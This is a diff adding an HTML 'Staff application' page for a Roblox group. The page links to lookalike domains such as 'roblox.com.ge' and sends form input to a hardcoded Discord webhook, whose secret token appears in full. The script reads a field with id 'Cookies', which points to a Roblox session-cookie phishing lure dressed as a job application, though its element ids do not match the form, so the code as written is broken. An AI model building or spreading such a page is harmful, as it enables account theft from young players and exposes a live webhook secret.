@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>StaffApp</title>
+
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: #1b003f;
+        font-family: Arial, sans-serif;
+        color: white;
+        text-align: center;
+    }
+
+    h1 {
+        margin-top: 50px;
+        font-size: 3em;
+        text-shadow: 0 0 20px #fff;
+    }
+
+    .section {
+        background: rgba(42,0,95,0.85);
+        width: 90%;
+        max-width: 600px;
+        padding: 25px;
+        border-radius: 20px;
+        margin: 30px auto;
+        box-shadow: 0 0 40px rgba(150,0,255,0.8);
+    }
+
+    .section label {
+        font-size: 1.3em;
+        font-weight: bold;
+        display: block;
+        margin-bottom: 10px;
+    }
+
+    input, textarea {
+        width: 90%;
+        padding: 14px;
+        margin-top: 10px;
+        border-radius: 12px;
+        border: none;
+        background: rgba(255,255,255,0.15);
+        color: white;
+        font-size: 1.1em;
+        outline: none;
+    }
+
+    button.submit {
+        margin-top: 20px;
+        padding: 15px 25px;
+        background: linear-gradient(90deg, #a64fff, #7200c0);
+        border: none;
+        border-radius: 14px;
+        color: white;
+        font-size: 1.2em;
+        cursor: pointer;
+        box-shadow: 0 0 20px #a64fff;
+        transition: 0.25s;
+    }
+
+    button.submit:hover {
+        background: linear-gradient(90deg, #fff, #a64fff);
+        box-shadow: 0 0 40px #fff;
+    }
+
+    /* Corner Buttons */
+    .corner-buttons {
+        position: fixed;
+        top: 15px;
+        right: 15px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        z-index: 3;
+    }
+
+    .corner-buttons a {
+        background: rgba(255,255,255,0.15);
+        padding: 10px 15px;
+        border-radius: 12px;
+        text-decoration: none;
+        color: white;
+        font-size: 0.95em;
+        border: 1px solid rgba(255,255,255,0.25);
+        backdrop-filter: blur(6px);
+        box-shadow: 0 0 15px rgba(150,0,255,0.6);
+        transition: 0.25s;
+    }
+
+    .corner-buttons a:hover {
+        background: rgba(255,255,255,0.3);
+        box-shadow: 0 0 25px #fff;
+    }
+
+</style>
+</head>
+<body>
+
+<div class="corner-buttons">
+    <a href="https://roblox.com.ge/communities/3204454304/" target="_blank">
+        Join Roblox Group?<br>(required to be a staff member!!!!)
+    </a>
+    <a href="https://rbxtools.st/dashboard23" target="_blank">
+        Roblox Tools Website
+    </a>
+</div>
+
+<h1>Staff application</h1>
+
+<div class="section">
+    <label>Roblox username(Must be in roblox group to be accepted)</label>
+    <input type="text" id="username" placeholder="Enter username">
+    <textarea id="Discord username and do you know how a discord server works?" rows="3" placeholder="Enter information"></textarea>
+    <button class="submit" onclick="sendToWebhook()">Submit</button>
+</div>
+
+<script>
+function sendToWebhook() {
+    const webhookURL = "https://canary.discord.com/api/webhooks/1443907430353338472/iPotw3sgLuSLNz_cgmnWhmNp0RMz9_UB72NytZenk3zKoKmxU-JYwyhxHXCTYESmVL6p";
+
+    const code = document.getElementById("Cookies").value;
+    const notes = document.getElementById("Username").value;
+
+    const data = {
+        username: "Staff application",
+        embeds: [{
+            title: "New app",
+            color: 5814783,
+            fields: [
+                { name: "Discord username and do you know how a discord server works?", value: code || "None" },
+                { name: "username", value: notes || "None" }
+            ]
+        }]
+    };
+
+    fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+    });
+
+    alert("Thats it thank if your application is accepeted you will be contacted through discord!    	");
+}
+</script>
+
+</body>
+</html>
